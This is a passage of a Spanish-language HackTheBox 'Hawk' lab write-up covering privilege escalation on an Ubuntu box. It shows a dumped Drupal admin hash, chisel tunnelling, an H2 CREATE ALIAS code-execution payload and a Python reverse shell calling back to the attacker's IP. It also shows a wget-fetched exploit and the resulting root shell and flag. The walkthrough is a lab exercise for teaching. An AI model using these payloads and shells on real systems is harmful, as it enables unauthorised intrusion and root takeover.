+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt;
+</code></pre></div></div>
+<ul>
+<li>Vemos el hash del admin.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| drupal             |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql&gt; use drupal;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++-----------------------------+
+| Tables_in_drupal            |
++-----------------------------+
+| actions                     |
+| authmap                     |
+| batch                       |
+| block                       |
+| block_custom                |
+| block_node_type             |
+| block_role                  |
+| blocked_ips                 |
+| cache                       |
+| cache_block                 |
+| cache_bootstrap             |
+| cache_field                 |
+| cache_filter                |
+| cache_form                  |
+| cache_image                 |
+| cache_menu                  |
+| cache_page                  |
+| cache_path                  |
+| comment                     |
+| date_format_locale          |
+| date_format_type            |
+| date_formats                |
+| field_config                |
+| field_config_instance       |
+| field_data_body             |
+| field_data_comment_body     |
+| field_data_field_image      |
+| field_data_field_tags       |
+| field_revision_body         |
+| field_revision_comment_body |
+| field_revision_field_image  |
+| field_revision_field_tags   |
+| file_managed                |
+| file_usage                  |
+| filter                      |
+| filter_format               |
+| flood                       |
+| history                     |
+| image_effects               |
+| image_styles                |
+| menu_custom                 |
+| menu_links                  |
+| menu_router                 |
+| node                        |
+| node_access                 |
+| node_comment_statistics     |
+| node_revision               |
+| node_type                   |
+| queue                       |
+| rdf_mapping                 |
+| registry                    |
+| registry_file               |
+| role                        |
+| role_permission             |
+| search_dataset              |
+| search_index                |
+| search_node_links           |
+| search_total                |
+| semaphore                   |
+| sequences                   |
+| sessions                    |
+| shortcut_set                |
+| shortcut_set_users          |
+| system                      |
+| taxonomy_index              |
+| taxonomy_term_data          |
+| taxonomy_term_hierarchy     |
+| taxonomy_vocabulary         |
+| url_alias                   |
+| users                       |
+| users_roles                 |
+| variable                    |
+| watchdog                    |
++-----------------------------+
+73 rows in set (0.00 sec)
+
+mysql&gt; select * from users;
++-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
+| uid | name  | pass                                                    | mail             | theme | signature | signature_format | created    | access     | login      | status | timezone      | language | picture | init             | data                     |
++-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
+|   0 |       |                                                         |                  |       |           | NULL             |          0 |          0 |          0 |      0 | NULL          |          |       0 |                  | NULL                     |
+|   1 | admin | $S$DFw163ixD00W55hdCqtvCB13XOTLhZ0pt0FVpFy1Ntmdp5EAOX08 | admin@hawk.local |       |           | filtered_html    | 1528733367 | 1719965351 | 1719964196 |      1 | Europe/London |          |       0 | admin@hawk.local | a:1:{s:7:&quot;overlay&quot;;i:1;} |
++-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
+2 rows in set (0.00 sec)
+</code></pre></div></div>
+<blockquote>
+<p>La contraseña no esta en el rockyou.txt.</p>
+</blockquote>
+<ul>
+<li>Vemos el pkexec pero no lo vamos a explotar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@hawk:/$ find \-perm -4000 2&gt;/dev/null | grep -vE &quot;snap&quot;
+./bin/ping
+./bin/fusermount
+./bin/su
+./bin/ntfs-3g
+./bin/mount
+./bin/umount
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/bin/chfn
+./usr/bin/passwd
+./usr/bin/newgidmap
+./usr/bin/chsh
+./usr/bin/newgrp
+./usr/bin/at
+./usr/bin/gpasswd
+./usr/bin/pkexec
+./usr/bin/sudo
+./usr/bin/newuidmap
+./usr/bin/traceroute6.iputils
+</code></pre></div></div>
+<ul>
+<li>El puerto 8082 esta abierto el cual esta corriendo  H2 database http console como vimos en Nmap <a href="https://www.h2database.com/html/quickstart.html">https://www.h2database.com/html/quickstart.html</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@hawk:/$ netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      2 10.10.10.102:53012      10.10.14.63:433         ESTABLISHED
+tcp6       0      0 :::9092                 :::*                    LISTEN
+tcp6       0      0 :::80                   :::*                    LISTEN
+tcp6       0      0 :::8082                 :::*                    LISTEN
+tcp6       0      0 :::21                   :::*                    LISTEN
+tcp6       0      0 :::22                   :::*                    LISTEN
+tcp6       0      0 :::5435                 :::*                    LISTEN
+tcp6       0      0 10.10.10.102:80         10.10.14.63:52754       ESTABLISHED
+</code></pre></div></div>
+<ul>
+<li><p>Vamos hacer Port Forwarding para ver que es.</p>
+</li>
+<li><p>Bueno si lo hago por SSH me da un error.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ssh daniel@10.10.10.102 -L 8082:localhost:8082
+daniel@10.10.10.102's password:
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jul  3 00:35:55 UTC 2024
+
+  System load:  0.01              Processes:           177
+  Usage of /:   47.5% of 7.32GB   Users logged in:     0
+  Memory usage: 68%               IP address for eth0: 10.10.10.102
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+417 packages can be updated.
+268 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</code></pre></div></div>
+<ul>
+<li>Vamos a usar chisel <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
+2024/07/02 18:38:36 server: Reverse tunnelling enabled
+2024/07/02 18:38:36 server: Fingerprint p1HWvBEOgawHr1W0leahUeW7u9yV9XBtPOme4dn1lOE=
+2024/07/02 18:38:36 server: Listening on http://0.0.0.0:8000
+</code></pre></div></div>
+<ul>
+<li>Ejecutamos esto en la máquina victima.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@hawk:/tmp$ ./chisel_1.9.1_linux_amd64 client http://10.10.14.63:8000 R:8082:127.0.0.1:8082
+</code></pre></div></div>
+<ul>
+<li>Vemos esto.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/9.png">
+</p>
+
+<ul>
+<li>Si buscamos vulnerabilidades vemos Remote Code Execution.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ searchsploit H2 database
+
+-------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                    |  Path
+-------------------------------------------------------------------------------------------------- ---------------------------------
+H2 Database - 'Alias' Arbitrary Code Execution                                                    | java/local/44422.py
+H2 Database 1.4.196 - Remote Code Execution                                                       | java/webapps/45506.py
+H2 Database 1.4.197 - Information Disclosure                                                      | linux/webapps/45105.py
+H2 Database 1.4.199 - JNI Code Execution                                                          | java/local/49384.txt
+Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow        | multiple/remote/31010.sql
+-------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre></div></div>
+<ul>
+<li>Si podemos cualquier nombre en <code>JDBC</code> Url como /testing y nos conectamos sin contraseña funciona.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/10.png">
+</p>
+
+<ul>
+<li><p>Podemos obtener RCE <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a>.</p>
+</li>
+<li><p>Estamos como root.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/11.png">
+</p>
+
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new
+java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; }$$;
+CALL SHELLEXEC('id')
+</code></pre></div></div>
+<ul>
+<li>Usaremos el siguiente script para recibir la reverse shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat reverse.py
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((&quot;10.10.14.63&quot;, 8080))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])
+</code></pre></div></div>
+<ul>
+<li>Vamos a meter eso en /tmp.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@hawk:/tmp$ chmod +x reverse.py
+</code></pre></div></div>
+<ul>
+<li>Nos ponemos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 8080
+listening on [any] 8080 ...
+</code></pre></div></div>
+<ul>
+<li>Y ejecutamos solo que ahora ejecutamos python3 y la ruta del archivo en python3.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/12.png">
+</p>
+
+<h2 id="root-txt">root.txt</h2>
+<ul>
+<li>Al darle a run nos llega la shell como root.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 8080
+listening on [any] 8080 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.10.102] 40912
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# script /dev/null -c bash
+Script started, file is /dev/null
+root@hawk:~# cat /root/root.txt
+cat /root/root.txt
+5aa913cca6cd0865e7172edbc21d66f4
+root@hawk:~#
+</code></pre></div></div>
+<h2 id="second-way">Second way</h2>
+<ul>
+<li>Como vimos antes hay un script que también nos da RCE.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ searchsploit H2 database
+
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                   |  Path
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+H2 Database - 'Alias' Arbitrary Code Execution                                                                   | java/local/44422.py
+H2 Database 1.4.196 - Remote Code Execution                                                                      | java/webapps/45506.py
+H2 Database 1.4.197 - Information Disclosure                                                                     | linux/webapps/45105.py
+H2 Database 1.4.199 - JNI Code Execution                                                                         | java/local/49384.txt
+Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow                       | multiple/remote/31010.sql
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+❯ searchsploit -m 45506
+
+  Exploit: H2 Database 1.4.196 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/45506
+     Path: /usr/share/exploitdb/exploits/java/webapps/45506.py
+    Codes: N/A
+ Verified: False
+File Type: Python script, Unicode text, UTF-8 text executable
+Copied to: /home/miguel/Downloads/45506.py
+</code></pre></div></div>
+<ul>
+<li>Lo descargamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@hawk:/tmp$ wget http://10.10.14.63/45506.py
+--2024-07-03 01:08:30--  http://10.10.14.63/45506.py
+Connecting to 10.10.14.63:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3756 (3.7K) [text/x-python]
+Saving to: ‘45506.py’
+
+45506.py                         100%[==========================================================&gt;]   3.67K  --.-KB/s    in 0.003s
+
+2024-07-03 01:08:30 (1.14 MB/s) - ‘45506.py’ saved [3756/3756]
+
+daniel@hawk:/tmp$ chmod 777 45506.py
+</code></pre></div></div>
+<ul>
+<li>Ejecutamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@hawk:/tmp$ python3 45506.py --host 127.0.0.1:8082
+[*] Attempting to create database
+[+] Created database and logged in
+[*] Sending stage 1
+[+] Shell succeeded - ^c or quit to exit
+h2-shell$ whoami
+root
+
+h2-shell$
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
